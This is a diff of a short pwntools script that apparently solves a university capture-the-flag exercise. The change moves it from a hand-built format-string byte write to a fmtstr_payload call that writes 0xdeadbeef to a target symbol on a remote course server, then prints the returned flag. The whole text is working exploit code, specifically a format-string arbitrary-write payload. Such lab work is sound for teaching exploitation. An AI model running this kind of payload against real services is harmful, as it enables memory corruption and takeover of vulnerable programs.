@@ -1,13 +1,13 @@
 from pwn import *
 
-elf = ELF('05_write_specific_byte')
+elf = ELF('06_write_big_number')
 target_address = elf.symbols['target']
 
 SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt" 
-PORT = 25195
+PORT = 25196
 
 s = remote(SERVER, PORT, timeout=9999)
-
-s.sendline(p32(target_address + 3) + b'.%253x%7$hhn')
+payload = fmtstr_payload(7, {target_address: 0xdeadbeef})
+s.sendline(payload )
 flag = s.recv(512)
 print(flag)
